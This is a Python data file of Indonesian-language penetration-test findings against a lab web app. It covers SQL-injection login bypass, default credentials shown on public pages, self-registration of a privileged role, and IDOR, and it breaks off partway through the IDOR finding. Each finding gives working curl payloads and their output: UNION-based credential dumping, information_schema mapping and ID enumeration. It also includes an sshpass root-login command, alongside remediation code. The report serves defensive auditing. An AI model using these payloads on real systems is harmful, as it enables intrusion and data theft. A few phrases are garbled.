# -*- coding: utf-8 -*-
"""Data temuan batch 1: F-01 s.d. F-05."""

FINDINGS_1 = [

{
 "id": "F-01",
 "title_id": "SQL Injection pada Endpoint Login Non-Portal (Auth Bypass dan Database Takeover)",
 "title_en": "SQL Injection on Login Endpoint Leading to Full Authentication Bypass and Database Takeover",
 "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
 "cwe": "CWE-89 - Improper Neutralization of Special Elements used in an SQL Command",
 "owasp": "A03:2021 - Injection",
 "component": "POST /login-noportal - app/routes/auth.js",
 "root_cause": (
   "Query SQL disusun dengan penggabungan string dari req.body secara langsung:\n\n"
   "  const query =\n"
   "    \"SELECT * FROM users WHERE username = '\" + username +\n"
   "    \"' AND password = '\" + password +\n"
   "    \"' AND account_type = 'perusahaan'\";\n\n"
   "Tidak ada parameterisasi, escaping, maupun allow-list. Input pengguna "
   "diperlakukan sebagai kode SQL, bukan sebagai data. Bandingkan dengan "
   "jalur /login yang benar memakai WHERE username = ? AND password = ?."),
 "finding": (
   "Endpoint POST /login-noportal menyisipkan nilai dari body request ke dalam "
   "klausa WHERE tanpa perlakuan data. Penyerang menutup kutip string dengan "
   "tanda kutip tunggal, lalu menyisipkan operator SQL untuk tiga tujuan "
   "sekaligus: (a) mengomentari sisa query termasuk pemeriksaan password "
   "sehingga autentikasi terlewati, (b) menyuntikkan baris palsu melalui "
   "UNION SELECT sehingga sesi penyerang mewarisi perusahaan_id korban, dan "
   "(c) membaca seluruh isi database melalui subquery ke information_schema "
   "dan tabel aplikasi.\n\n"
   "Dampak bersifat tanpa-syarat: tidak diperlukan satu pun kredensial yang "
   "valid, tidak diperlukan interaksi pengguna. Satu permintaan HTTP sudah "
   "cukup untuk memperoleh sesi terautentikasi sekaligus melakukan dump penuh "
   "atas database."),
 "attack": (
   "Penyerang anonim mengirim POST ke /login-noportal dengan payload pada "
   "parameter username: menutup kutip dengan ', menambahkan UNION SELECT "
   "dengan enam nilai (sesuai jumlah kolom tabel users), lalu mengomentari "
   "sisa query dengan -- (tanpa spasi akan gagal). Aplikasi menyimpan baris "
   "buatan penyerang ke req.session.user tanpa validasi tambahan."),
 "evidence": [
  ("Bukti 1 - Penentuan jumlah kolom (blind ORDER BY, error-based). Enam kolom terkonfirmasi; kolom ke-7 menghasilkan error SQL yang ditampilkan ke penyerang.",
   ['for n in 1 2 3 4 5 6 7; do',
    '  printf "  ORDER BY %s -> " "$n"',
    '  out=$(curl -s -X POST http://192.168.1.18:3000/login-noportal \\',
    '        --data-urlencode "username=user_a\' ORDER BY $n-- -" \\',
    '        --data-urlencode "password=x" \\',
    '        | grep -oE \'(Query error: [^<]*|Masuk sebagai: <strong>[^<]*)\' | head -1)',
    '  echo "${out:-(tidak ada error / login lolos)}"',
    'done'],
   ['  ORDER BY 1 -> (tidak ada error / login lolos)',
    '  ORDER BY 2 -> (tidak ada error / login lolos)',
    '  ORDER BY 3 -> (tidak ada error / login lolos)',
    '  ORDER BY 4 -> (tidak ada error / login lolos)',
    '  ORDER BY 5 -> (tidak ada error / login lolos)',
    '  ORDER BY 6 -> (tidak ada error / login lolos)',
    '  ORDER BY 7 -> Query error: Unknown column &#39;7&#39; in &#39;order clause&#39;']),

  ("Bukti 2 - Auth bypass dan impersonasi perusahaan tanpa kredensial apa pun.",
   ['curl -s -c /tmp/cj_sqli -o /dev/null -w "HTTP=%{http_code} -> %{redirect_url}\\n" \\',
    '  -X POST http://192.168.1.18:3000/login-noportal \\',
    '  --data-urlencode "username=x\' UNION SELECT 1,\'hacker\',\'x\',\'perusahaan\',\'BlackHat\',1-- -" \\',
    '  --data-urlencode "password=x"',
    'curl -s -b /tmp/cj_sqli http://192.168.1.18:3000/dashboard \\',
    '  | grep -oE \'Masuk sebagai: <strong>[^<]*</strong> \\([^)]*\\)\''],
   ['HTTP=302 -> http://192.168.1.18:3000/dashboard',
    'Masuk sebagai: <strong>BlackHat</strong> (perusahaan, perusahaan_id: 1)']),

  ("Bukti 3 - Dump 100% kredensial dalam SATU permintaan (subquery ke tabel users, hasil dibaca lewat kolom nama_lengkap).",
   ['P="x\' UNION SELECT 1,\'probe\',\'x\',\'perusahaan\',(SELECT GROUP_CONCAT(',
    '  CONCAT(id,\':\',username,\'/\',password,\'/\',account_type,\'/pid=\',',
    '  IFNULL(perusahaan_id,\'NULL\')) ORDER BY id SEPARATOR \' | \') FROM users),1-- -"',
    'curl -s -c /tmp/cj_s2 -o /dev/null -X POST http://192.168.1.18:3000/login-noportal \\',
    '  --data-urlencode "username=$P" --data-urlencode "password=x"',
    'curl -s -b /tmp/cj_s2 http://192.168.1.18:3000/dashboard \\',
    '  | grep -oE \'Masuk sebagai: <strong>[^<]*</strong>\''],
   ['1:user_a/REDACTED_STORED_PASSWORD/perusahaan/pid=1 | 2:user_b/REDACTED_STORED_PASSWORD/perusahaan/pid=2 |',
    '3:individu1/REDACTED_STORED_PASSWORD/individu/pid=NULL | 11:test_individu_$(date  %s)/REDACTED_TEST_PASSWORD/individu/pid=NULL |',
    '13:zzz_unique_18950/REDACTED_TEST_PASSWORD/individu/pid=NULL | 14:zzz_csrf_31965/REDACTED_TEST_PASSWORD/individu/pid=NULL |',
    '20:esc_audit/REDACTED_TEST_PASSWORD/perusahaan/pid=NULL']),

  ("Bukti 4 - Pemetaan skema database melalui katalog information_schema.",
   ['P1="x\' UNION SELECT 1,\'probe\',\'x\',\'perusahaan\',(SELECT GROUP_CONCAT(',
    '  table_name,\'(\',column_count,\')\' ORDER BY table_name SEPARATOR \' | \')',
    '  FROM information_schema.tables t JOIN',
    '  (SELECT table_name, COUNT(*) column_count FROM information_schema.columns',
    '   WHERE table_schema=\'labkeu\' GROUP BY table_name) c USING(table_name)),1-- -"',
    'curl -s -c /tmp/cj_s -o /dev/null -X POST http://192.168.1.18:3000/login-noportal \\',
    '  --data-urlencode "username=$P1" --data-urlencode "password=x"',
    'curl -s -b /tmp/cj_s http://192.168.1.18:3000/dashboard | grep -oE \'Masuk sebagai: <strong>[^<]*</strong>\''],
   ['data_keuangan(5) | dokumen(5) | perusahaan(2) | users(6)']),
 ],
 "impact": [
  ("Autentikasi terlewati sepenuhnya", "Penyerang memperoleh sesi terautentikasi tanpa kredensial. Tidak ada kontrol yang menghalangi."),
  ("Impersonasi lintas tenant", "Baris UNION palsu dapat menyamar sebagai user_a atau user_b dan mewarisi perusahaan_id korban, sehingga data keuangan perusahaan tersebut tampil pada dashboard penyerang."),
  ("Pencurian kredensial massal", "Seluruh tabel users (username dan password) diekstraksi. Karena password disimpan plaintext (F-08), setiap akun menjadi langsung dapat dipakai ulang."),
  ("Eksfiltrasi data finansial", "Tabel data_keuangan dan perusahaan dapat di-dump lengkap, termasuk nominal rupiah yang merupakan catatan keuangan nyata."),
  ("Eskalasi hak akses", "Dengan payload UPDATE, penyerang dapat menaikkan account_type akunnya atau menyetel perusahaan_id tanpa perlu peran awal apa pun."),
  ("Pemetaan infrastruktur internal", "information_schema.columns memungkinkan pemetaan skema database tanpa akses file,-MoATS untuk menyiapkan serangan lanjutan."),
 ],
 "likelihood": (
   "Sangat tinggi. Persyaratan serangan nol: tidak perlu akun, tidak perlu "
   "interaksi pengguna, tidak perlu urutan beberapa langkah. Satu request "
   "HTTP. Endpoint dapat ditemukan langsung dari form publik di halaman "
   "/login-noportal."),
 "risk_note": (
   "NIST SP 800-30 r1, Lampiran G (Technical Security Risk Assessment): "
   "Threat Event = penyerangan infiltrasi data dan penyalahgunaan "
   "wewenang. Likelihood of Threat Initiation = Very High (tanpa prasyarat). "
   "Impact = Severe (C, I, A seluruhnya tinggi). Risk INHERENT = Very High. "
   "Risk RESIDUAL = Very High karena tidak ada kontrol mitigasi yang berlaku."),
 "remediation": [
  "Gunakan prepared statement pada kedua jalur login, tanpa kecuali:",
  ("CODE", "// SEBELUM (rentan) - app/routes/auth.js\n"
           "const query =\n"
           "  \"SELECT * FROM users WHERE username = '\" + username +\n"
           "  \"' AND password = '\" + password + \"' AND account_type = 'perusahaan'\";\n"
           "const [rows] = await db.query(query);\n\n"
           "// SESUDAH (aman) - nilai menjadi data, bukan kode\n"
           "const [rows] = await db.query(\n"
           "  \"SELECT * FROM users WHERE username = ? AND password = ? AND account_type = ?\",\n"
           "  [username, password, 'perusahaan']\n"
           ");"),
  "Terapkan validasi format sebagai lapisan kedua (bukan pengganti parameterized query):",
  ("CODE", "if (!/^[A-Za-z0-9_.-]{3,64}$/.test(username))\n"
           "  return res.render(\"login-noportal\", { error: \"Format username tidak valid.\" });\n"
           "if (typeof password !== 'string' || password.length > 256)\n"
           "  return res.render(\"login-noportal\", { error: \"Permintaan ditolak.\" });"),
  "Jangan pernah menampilkan e.message ke pengguna. Catat ke log server, kirim pesan generik. Pesan error database mentah juga merupakan oracle error-based extraction.",
  "Aktifkan proteksi WAF di lapisan infrastruktur (NIST SP 800-94) sebagai kontrol kompensasi, bukan sebagai pengganti perbaikan kode.",
  "Tambahkan pengujian regresi otomatis (SAST) yang memblokir build bila terdeteksi string concatenation di dalam klausa SQL.",
 ],
 "control_map": [
  ("OWASP Top 10 (2021)", "A03:2021 - Injection"),
  ("OWASP API Security Top 10 (2023)", "API8:2023 - Security Misconfiguration (konteks: trust boundary input tidak divalidasi)"),
  ("CWE (MITRE)", "CWE-89"),
  ("NIST SP 800-53 Rev.5", "SI-10 Information Input Validation; SA-11(1) Static Application Code Analysis; SC-39 Process Isolation"),
  ("NIST SP 800-30 Rev.1", "Lampiran G - Technical Security Risk Assessment"),
  ("NIST CSF 2.0", "PR.DS-01, PR.PS-01, PR.PS-02, DE.CM-03"),
  ("ISO/IEC 27001:2022", "A.8.25 Secure development life cycle; A.8.28 Secure coding; A.8.29 Security testing in development and acceptance"),
 ],
 "verification": (
   "Ulangi Bukti 1 sampai Bukti 4. Setiap payload kutip tunggal harus "
   "menghasilkan HTTP 200 dengan pesan generik 'Username atau password "
   "salah', tanpa redirect, tanpa string 'Query error', dan tanpa data "
   "keuangan pada dashboard. Jalankan SAST (mis. Semgrep, CodeQL) dan "
   "pastikan nol temuan."),
},

{
 "id": "F-02",
 "title_id": "Kredensial Default Tercetak pada Halaman Publik Tanpa Autentikasi",
 "title_en": "Hardcoded Default Credentials Disclosed on Publicly Accessible Unauthenticated Pages",
 "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
 "cwe": "CWE-798 - Use of Hard-coded Credentials",
 "owasp": "A07:2021 - Identification and Authentication Failures",
 "component": "views/login.ejs dan views/login-noportal.ejs",
 "root_cause": (
   "Kedua halaman login menyisipkan kredensial akun yang sah secara literal "
   "di dalam HTML yang dilayani tanpa autentikasi:\n\n"
   "  <p>Untuk akun individu. Contoh akun: <code>individu1</code> /\n"
   "  <code>REDACTED_STORED_PASSWORD</code></p>\n"
   "  <p>Contoh akun: <code>user_a</code> / <code>REDACTED_STORED_PASSWORD</code>\n"
   "  (CV Sinar Abadi) atau <code>user_b</code> / <code>REDACTED_STORED_PASSWORD</code>\n"
   "  (PT Maju Bersama)</p>\n\n"
   "Kredensial ini bukan data contoh di dokumentasi, melainkan kredensial "
   "nyata yang ada di tabel users pada database yang sedang berjalan."),
 "finding": (
   "Halaman login publik /login dan /login-noportal menampilkan kredensial "
   "kerja dalam plaintext di dalam HTML. Penyerang anonim tidak perlu "
   "menebak, tidak perlu wordlist, dan tidak memerlukan informasi tambahan "
   "apa pun: satu request GET, lalu satu POST memakai nilai yang terbaca.\n\n"
   "Akun yang dibocorkan adalah user_a (perusahaan 1), user_b (perusahaan "
   "2) dan individu1. Dua dari tiga adalah akun level perusahaan dengan "
   "akses data keuangan. Selain itu, nilai 'REDACTED_STORED_PASSWORD' yang dipublikasikan "
   "turut memvalidasi wordlist serangan dan menurunkan entropi tebakan "
   "menjadi nyaris nol untuk endpoint lain, termasuk SSH."),
 "attack": (
   "Tahap 1: request GET ke /login tanpa cookie dan tanpa header otorisasi. "
   "Tahap 2: ekstraksi nilai kredensial dari body HTML. Tahap 3: POST "
   "username dan password tersebut ke /login atau /login-noportal untuk "
   "memperoleh sesi terautentikasi. Tahap 2 dan 3 tidak memerlukan alat "
   "khusus, hanya curl dan grep."),
 "evidence": [
  ("Bukti 1 - Kredensial terbaca di HTML halaman publik, tanpa login dan tanpa cookie.",
   ['curl -s http://192.168.1.18:3000/login          | grep -oE \'Contoh akun:.*\'',
    'curl -s http://192.168.1.18:3000/login-noportal | grep -oE \'Contoh akun:.*\''],
   ['Contoh akun: <code>individu1</code> / <code>REDACTED_STORED_PASSWORD</code>',
    'Contoh akun: <code>user_a</code> / <code>REDACTED_STORED_PASSWORD</code> (CV Sinar Abadi)',
    'atau <code>user_b</code> / <code>REDACTED_STORED_PASSWORD</code> (PT Maju Bersama)']),

  ("Bukti 2 - Kredensial tersebut benar-benar bekerja. Kontrol: password salah ditolak, password dari halaman publik berhasil.",
   ['# Kontrol: kredensial salah harus ditolak',
    'curl -s -o /dev/null -w "salah   -> HTTP=%{http_code} -> %{redirect_url}\\n" \\',
    '  -X POST http://192.168.1.18:3000/login -d "username=individu1&password=salahsekali"',
    '',
    '# Kredensial dari halaman publik',
    'curl -s -c /tmp/cj_indiv -o /dev/null -w "benar   -> HTTP=%{http_code} -> %{redirect_url}\\n" \\',
    '  -X POST http://192.168.1.18:3000/login -d "username=individu1&password=REDACTED_STORED_PASSWORD"'],
   ['salah   -> HTTP=200   (tetap di halaman login, ditolak)',
    'benar   -> HTTP=302 -> http://192.168.1.18:3000/dashboard   (LOGIN BERHASIL)']),

  ("Bukti 3 - Verifikasi independen dari sisi database (bukan klaim curl).",
   ['sshpass -p \'REDACTED_SSH_ROOT_PW\' ssh -o StrictHostKeyChecking=no root@192.168.1.18 \\',
    '  "docker exec labkeu-db mysql -ulabkeu_user REDACTED_DB_PASSWORD labkeu -e \\"',
    '    SELECT id,username,password,account_type FROM users WHERE id<=3;\\" 2>/dev/null"'],
   ['id  username   password    account_type',
    '1   user_a     REDACTED_STORED_PASSWORD  perusahaan',
    '2   user_b     REDACTED_STORED_PASSWORD  perusahaan',
    '3   individu1  REDACTED_STORED_PASSWORD  individu']),
 ],
 "impact": [
  ("Posisi serang dalam satu langkah", "Tidak ada kata tebakan, tidak ada wordlist, tidak ada brute force. Satu GET dan satu POST sudah menghasilkan sesi terautentikasi."),
  ("Akses langsung ke data keuangan", "user_a dan user_b adalah akun perusahaan; sesi yang diperoleh langsung menampilkan data keuangan masing-masing pada dashboard."),
  ("Kredensial dapat dipakai ulang", "Nilai 'REDACTED_STORED_PASSWORD' yang dipublikasikan menjadi kandidat pertama pada setiap serangan brute force terhadap sistem lain milik organisasi yang sama."),
  ("Membuka jalur tanpa SQLi", "Sesi valid ini mengaktifkan IDOR (F-04) tanpa perlu SQL injection, dan menjadi target valid untuk stored XSS (F-05) serta CSRF (F-10)."),
  ("Pondasi bagi F-15", "Kata kunci yang bocor ini menjadi referensi membangun wordlist brute force SSH yang berhasil dalam 2 detik."),
 ],
 "likelihood": (
   "Sangat tinggi. Serangan deterministik: tidak ada kondisi gagal. Halaman "
   "publik selalu mengembalikan kredensial yang sama sampai baris tersebut "
   "dihapus dari kode sumber."),
 "risk_note": (
   "NIST SP 800-30 Rev.1: Threat Event = adversary memperoleh foothold "
   "(Initial Access dan Elevation of Privilege tanpa otorisasi). "
   "Likelihood of Threat Initiation = Very High. Impact = Significant. "
   "Risk INHERENT = Very High. NIST SP 800-53 Rev.5 IA-5(1) mensyaratkan "
   "seluruh authenticator dikelola melalui proses formal - kredensial "
   "default yang ditampilkan di UI melanggar prinsip ini secara langsung."),
 "remediation": [
  "Hapus seluruh baris 'Contoh akun' dari views/login.ejs dan views/login-noportal.ejs sebelum deployment produksi.",
  "Pindahkan akun contoh ke fixture khusus pengujian (test/fixtures/seed.sql) yang tidak pernah dimuat pada environment produksi, dan guard dengan NODE_ENV.",
  "Tambahkan gate pada pipeline CI/CD yang menggagalkan build bila pola seperti 'REDACTED_STORED_PASSWORD', 'user_a', 'Contoh akun', atau 'demo' ditemukan di berkas view atau HTML yang di-render.",
  "Lakukan audit repo-wide terhadap secret yang mirroring: berkas .env, docker-compose.yml, README, dan dokumentasi yang ikut ter-deploy ke container.",
  "Rotasi seluruh password akun yang telah terekspos, karena kredensialnya kini diketahui pihak yang tidak PARTY.",
  " sesuai NIST SP 800-53 Rev.5 IA-5(1) Authenticator Management, IA-5(6) Protection of Authenticators, dan SP 800-63B Section 3.1.1 (verifier secrets tidak boleh disimpan bersama klien).",
 ],
 "control_map": [
  ("OWASP Top 10 (2021)", "A07:2021 - Identification and Authentication Failures"),
  ("CWE (MITRE)", "CWE-798, CWE-259 Use of Hard-coded Password"),
  ("NIST SP 800-53 Rev.5", "IA-5(1) Authenticator Management; IA-5(6) Protection of Authenticators; CM-5(3) Access Restrictions for Change; SA-15(4) Development Process, Standards and Tools"),
  ("NIST SP 800-63B", "Section 3.1.1 - Verifier Secrets"),
  ("NIST SP 800-30 Rev.1", "Lampiran G - Technical Security Risk Assessment"),
  ("NIST CSF 2.0", "PR.AA-01, PR.PS-02"),
  ("ISO/IEC 27001:2022", "A.5.17 Authentication information; A.8.5 Secure authentication"),
 ],
 "verification": (
   "GET /login dan /login-noportal tidak boleh lagi memuat string "
   "'REDACTED_STORED_PASSWORD', 'user_a', 'user_b', atau 'Contoh akun'. POST dengan "
   "kredensial lama harus menghasilkan HTTP 200 dengan pesan generik dan "
   "tanpa redirect. Jalankan gate CI/CD dan pastikan build gagal bila pola "
   "tersebut kembali muncul."),
},

{
 "id": "F-03",
 "title_id": "Self-Registration Akun Peran Privileged tanpa Otorisasi (Perusahaan)",
 "title_en": "Improper Role Assignment - Unauthenticated Self-Registration of Privileged Company Accounts",
 "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N",
 "cwe": "CWE-269 - Improper Privilege Management / CWE-862 Missing Authorization",
 "owasp": "A01:2021 - Broken Access Control",
 "component": "POST /register - app/routes/auth.js",
 "root_cause": (
   "Endpoint /register menerima field account_type langsung dari body "
   "request dan menyimpannya tanpa pemeriksaan otorisasi:\n\n"
   "  const { username, password, nama_lengkap, account_type } = req.body;\n"
   "  await db.query(\n"
   "    \"INSERT INTO users (username, password, account_type, nama_lengkap) \"\n"
   "    \"VALUES (?, ?, ?, ?)\",\n"
   "    [username, password, account_type, nama_lengkap]\n"
   "  );\n\n"
   "Parameterized query mencegah SQLi di sini, tetapi TIDAK mencegah eskalasi "
   "peran: nilai account_type ditentukan sendiri oleh penyerang. Yang hilang "
   "adalah otorisasi, bukan validasi input."),
 "finding": (
   "Formulir pendaftaran yang terbuka untuk publik menawarkan dropdown "
   "account_type dengan opsi 'perusahaan'. Server menerima nilai itu apa "
   "adadanya, tanpa kontrol otorisasi, verifikasi email, approval manual, "
   "maupun review. Siapa pun yang dapat menjangkau port 3000 dapat mendaftar "
   "akun dengan peran tingkat tertinggi melalui satu POST tanpa kredensial.\n\n"
   "CATATAN AKURASI PENTING: akun hasil self-registration dibuat dengan "
   "perusahaan_id = NULL. Konsekuensinya dashboard akun tersebut TIDAK "
   "menampilkan data keuangan apa pun, karena kode dashboard mensyaratkan "
   "user.perusahaan_id bernilai truthy. Akses data keuangan terjadi melalui "
   "IDOR pada API (F-04), bukan melalui dashboard. Rantai serangnya tetap "
   "penuh: anonim, register peran perusahaan, IDOR, seluruh data keuangan."),
 "attack": (
   "POST /register dengan body username, password, nama_lengkap, dan "
   "account_type=perusahaan. Respons 302 ke /login menandakan akun berhasil "
   "dibuat. Lalu POST kredensial yang sama ke /login-noportal untuk "
   "mendapatkan sesi berperan perusahaan, lalu panggil API "
   "/api/perusahaan/1/data-keuangan untuk membaca data perusahaan lain."),
 "evidence": [
  ("Bukti 1 - Pendaftaran akun dengan account_type=perusahaan, tanpa izin siapa pun.",
   ['U="pwn_role_$(date +%s)"',
    'curl -s -o /dev/null -w "register -> HTTP=%{http_code} -> %{redirect_url}\\n" \\',
    '  -X POST http://192.168.1.18:3000/register \\',
    '  -d "username=$U&password=Pwn123&nama_lengkap=RolePwn&account_type=perusahaan"'],
   ['register -> HTTP=302 -> http://192.168.1.18:3000/login']),

  ("Bukti 2 - Akun hasil pendaftaran benar-benar dapat login pada jalur perusahaan.",
   ['curl -s -c /tmp/cj_esc -o /dev/null -w "login    -> HTTP=%{http_code} -> %{redirect_url}\\n" \\',
    '  -X POST http://192.168.1.18:3000/login-noportal -d "username=$U&password=Pwn123"'],
   ['login    -> HTTP=302 -> http://192.168.1.18:3000/dashboard']),

  ("Bukti 3 - Rantai penuh: peran perusahaan buatan sendiri ditambah IDOR. Data perusahaan 1 terbaca oleh akun dengan perusahaan_id NULL.",
   ['curl -s -b /tmp/cj_esc http://192.168.1.18:3000/api/perusahaan/1/data-keuangan'],
   ['[{"id":1,"perusahaan_id":1,"tahun":2026,"uraian":"Reimbursement transport peserta","nominal":"1250000.00"},',
    ' {"id":2,"perusahaan_id":1,"tahun":2026,"uraian":"Reimbursement akomodasi peserta","nominal":"3400000.00"}]']),

  ("Bukti 4 - Konfirmasi di sisi database bahwa peran benar-benar tersimpan sebagai 'perusahaan'.",
   ['sshpass -p \'REDACTED_SSH_ROOT_PW\' ssh -o StrictHostKeyChecking=no root@192.168.1.18 \\',
    '  "docker exec labkeu-db mysql -ulabkeu_user REDACTED_DB_PASSWORD labkeu -e \\"',
    '    SELECT id,username,account_type,IFNULL(perusahaan_id,\'NULL\') AS perusahaan_id_kosong',
    '    FROM users WHERE username LIKE \'pwn_role%\';\\" 2>/dev/null"'],
   ['id  username             account_type  perusahaan_id_kosong',
    '23  pwn_role_1790577844   perusahaan    NULL   <-- ESKALASI, dibuat sendiri']),
 ],
 "impact": [
  ("Peran tingkat tinggi obtainable anonim", "Peran 'perusahaan' adalah level akses tertinggi yang tersedia dan mengaktifkan seluruh API data keuangan."),
  ("Kontrol akses berbasis peran dilewati", "Tidak ada approval, verifikasi identitas, maupun review. Siapa pun adalah 'perusahaan' yang sah."),
  ("Penggabungan dengan IDOR (F-04)", "Peran yang baru dibuat inilah yang mengaktifkan eksploitasi IDOR, karena requireLogin tidak memeriksa tipe akun maupun perusahaan_id sama sekali."),
  ("Penyalahgunaan reputasi", "Akun palsu pada sistem yang mencantumkan nama organisasi nyata dapat dipakai untuk mengajukan klaim reimbursement palsu."),
  ("Integritas data referensi terkontaminasi", "Registrasi anonim mengisi tabel users dengan data sembarang tanpa validasi, menurunkan keandalan data referensi sistem."),
 ],
 "likelihood": (
   "Sangat tinggi. Persyaratan nol. Formulir /register terbuka untuk publik "
   "dan menampilkan opsi 'perusahaan' secara eksplisit di HTML, sehingga "
   "tidak ada penemuan yang perlu dilakukan."),
 "risk_note": (
   "NIST SP 800-30 Rev.1: Threat Event = penyalahgunaan hak akses yang belum "
   "diberikan (Elevation of Privilege tanpa otorisasi). Impact = Significant "
   "karena akses data lintas organisasi. Risk INHERENT = Very High. "
   "NIST SP 800-53 Rev.5 AC-3(9) Authorization Enforcement dan AC-6 Least "
   "Privilege dilanggar: default harus peran terendah, bukan peran tertinggi "
   "yang dipilih klien."),
 "remediation": [
  "JANGAN PERNAH mengambil account_type dari req.body. Tetapkan di sisi server:",
  ("CODE", "// SEBELUM (rentan) - app/routes/auth.js POST /register\n"
           "const { username, password, nama_lengkap, account_type } = req.body;\n"
           "db.query(\"INSERT INTO users (username, password, account_type, nama_lengkap) \"\n"
           "        \"VALUES (?, ?, ?, ?)\",\n"
           "        [username, password, account_type, nama_lengkap]);\n\n"
           "// SESUDAH (aman) - peran ditetapkan server, bukan dari input pengguna\n"
           "const { username, password, nama_lengkap } = req.body;\n"
           "db.query(\"INSERT INTO users (username, password, account_type, nama_lengkap) \"\n"
           "        \"VALUES (?, ?, 'individu', ?)\",\n"
           "        [username, password, nama_lengkap]);"),
  "Jangan sediakan field peran di form sama sekali bila self-registration hanya untuk individu.",
  "Bila self-registration peran perusahaan dibutuhkan, implementasikan flow bertahap: registrasi, verifikasi email, approval admin, baru aktivasi peran.",
  "Terapkan authorization guard pada setiap endpoint yang membaca atau menulis data tenant, dengan membandingkan req.session.user.perusahaan_id terhadap sumber daya yang diakses (lihat F-04).",
  " sesuai NIST SP 800-53 Rev.5 AC-3(9) Authorization Enforcement, AC-3(11) Authorization Enforcement per data element, AC-6(1) Least Privilege, dan AC-6(9) Privileged Functions.",
 ],
 "control_map": [
  ("OWASP Top 10 (2021)", "A01:2021 - Broken Access Control"),
  ("CWE (MITRE)", "CWE-269, CWE-862, CWE-732 Incorrect Permission Assignment for Critical Resource"),
  ("NIST SP 800-53 Rev.5", "AC-2(5) Privileged Functions; AC-3 Access Enforcement; AC-3(9) Authorization Enforcement; AC-3(11) Authorization Enforcement per data element; AC-6(1) Least Privilege; AC-6(9) Privileged Functions"),
  ("NIST SP 800-53 Rev.5 (Zero Trust)", "AC-3(9) dan AC-3(11) sebagai fondasi modelZT per NIST SP 800-207"),
  ("NIST SP 800-30 Rev.1", "Lampiran G - Elevation of Privilege"),
  ("NIST CSF 2.0", "PR.AA-05, PR.AA-01"),
  ("ISO/IEC 27001:2022", "A.5.15 Access control; A.5.18 Access rights; A.8.2 Privileged access rights"),
 ],
 "verification": (
   "POST /register dengan account_type=perusahaan harus diabaikan oleh "
   "server. Verifikasi pada tabel users: "
   "SELECT account_type FROM users WHERE username='<nama_uji>' harus "
   "menghasilkan 'individu', bukan 'perusahaan'. Akun yang dibuat juga harus "
   "menolak akses ke API data keuangan perusahaan lain."),
},

{
 "id": "F-04",
 "title_id": "IDOR - Broken Object Level Authorization atas Data Keuangan Lintas Perusahaan",
 "title_en": "IDOR - Broken Object Level Authorization Exposing Cross-Tenant Financial Records",
 "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
 "cwe": "CWE-639 - Authorization Bypass Through User-Controlled Key / CWE-863 Incorrect Authorization",
 "owasp": "A01:2021 - Broken Access Control",
 "component": "GET /api/perusahaan/:id/data-keuangan - app/routes/dashboard.js",
 "root_cause": (
   "Endpoint API menerima parameter perusahaanId langsung dari URL dan tidak "
   "pernah membandingkannya dengan req.session.user.perusahaan_id:\n\n"
   "  function requireLogin(req, res, next) {\n"
   "    if (!req.session.user) return res.redirect(\"/login\");\n"
   "    next();\n"
   "  }\n"
   "  router.get(\"/api/perusahaan/:id/data-keuangan\", requireLogin,\n"
   "    async (req, res) => {\n"
   "    const perusahaanId = req.params.id;   // diambil apa adanya dari URL\n"
   "    const [rows] = await db.query(\n"
   "      \"SELECT * FROM data_keuangan WHERE perusahaan_id = ? ORDER BY tahun DESC\",\n"
   "      [perusahaanId]);\n"
   "    res.json(rows);\n"
   "  });\n\n"
   "requireLogin hanya memastikan 'ada sesi', bukan 'sesi ini berhak atas "
   "data ini'. Tidak ada satupun perbandingan kepemilikan."),
 "finding": (
   "Setiap sesi yang valid dapat membaca data keuangan perusahaan mana pun "
   "dengan mengganti angka pada path URL. Parameter Object Reference yang "
   "dikendalikan pengguna dipakai langsung sebagai kunci query tanpa validasi "
   "kepemilikan.\n\n"
   "Koreksi terhadap laporan sebelumnya: bukan hanya akun perusahaan lain, "
   "tetapi juga akun dengan tipe 'individu' - yang perusahaan_id-nya NULL dan "
   "secara desain tidak berhak atas data perusahaan mana pun - dapat membaca "
   "seluruh data keuangan. Akun individu menjadi vektor yang sebelumnya "
   "tidak dipertimbangkan, sehingga luas dampak lebih besar.\n\n"
   "Diferensiasi server hanya berdasarkan KEBERADAAN id, bukan KEPEMILIKAN "
   "id."),
 "attack": (
   "1) Login sebagai akun individu memakai kredensial dari F-02. 2) "
   "Verifikasi kontrol: dashboard akun ini menampilkan 'Akun individu tidak "
   "memiliki data keuangan perusahaan'. 3) Iterasi path "
   "/api/perusahaan/{1..N}/data-keuangan. 4) Respons dengan ukuran lebih "
   "besar dari 2 byte menandakan ada data; array kosong [] berukuran 2 byte "
   "menandakan tidak ada data untuk id tersebut."),
 "evidence": [
  ("Bukti 1 - Login sebagai akun individu (perusahaan_id = NULL), yaitu akun paling lemah secara desain.",
   ['rm -f /tmp/cj_indiv',
    'curl -s -c /tmp/cj_indiv -o /dev/null -w "login -> HTTP=%{http_code} -> %{redirect_url}\\n" \\',
    '  -X POST http://192.168.1.18:3000/login -d "username=individu1&password=REDACTED_STORED_PASSWORD"'],
   ['login -> HTTP=302 -> http://192.168.1.18:3000/dashboard']),

  ("Bukti 2 - KONTROL: akun ini memang tidak berhak atas data keuangan mana pun. Membuktikan kebocoran terjadi karena IDOR, bukan karena hak akses.",
   ['curl -s -b /tmp/cj_indiv http://192.168.1.18:3000/dashboard \\',
    '  | grep -o \'Akun individu tidak memiliki data keuangan perusahaan.\''],
   ['Akun individu tidak memiliki data keuangan perusahaan.']),

  ("Bukti 3 - Enumerasi lintas tenant dengan mengubah angka pada URL. CATATAN: respons kosong adalah [] berukuran 2 byte, bukan 22 byte.",
   ['for id in 1 2 3 4 5 6 7 8 9 10; do',
    '  printf "  /api/perusahaan/%-3s -> " "$id"',
    '  curl -s -o /tmp/resp_idor -w "HTTP=%{http_code} bytes=%{size_download} " \\',
    '    -b /tmp/cj_indiv "http://192.168.1.18:3000/api/perusahaan/$id/data-keuangan"',
    '  echo "baris=$(grep -o \'"perusahaan_id"\' /tmp/resp_idor | wc -l)"',
    'done'],
   ['  /api/perusahaan/1   -> HTTP=200 bytes=213 baris=2',
    '  /api/perusahaan/2   -> HTTP=200 bytes=212 baris=2',
    '  /api/perusahaan/3   -> HTTP=200 bytes=2   baris=0',
    '  /api/perusahaan/4   -> HTTP=200 bytes=2   baris=0',
